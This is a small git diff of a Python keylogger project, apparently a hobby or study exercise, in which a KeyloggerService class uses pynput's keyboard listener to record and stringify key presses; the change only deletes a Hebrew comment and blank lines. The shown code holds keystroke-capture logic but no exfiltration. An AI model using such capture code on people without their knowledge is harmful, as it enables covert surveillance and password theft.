@@ -2,9 +2,7 @@ from keylogger.inter_face import IKeyLogger
 from typing import List
 from pynput.keyboard import Key, Listener, KeyCode
 
-# יבוא מקובץ תווים מיוחדים
 from keylogger.special_characters import special_keys
-
 
 class KeyloggerService(IKeyLogger):
     def __init__(self):
@@ -23,12 +21,10 @@ class KeyloggerService(IKeyLogger):
         self.presses = list()
         return result
 
-
     def key_to_string(self,key):
         if isinstance(key, KeyCode):
             return key.char or ""
         return special_keys.get(key, f"<{key}>")
-
 
     def press(self,key):
         key_str = self.key_to_string(key)
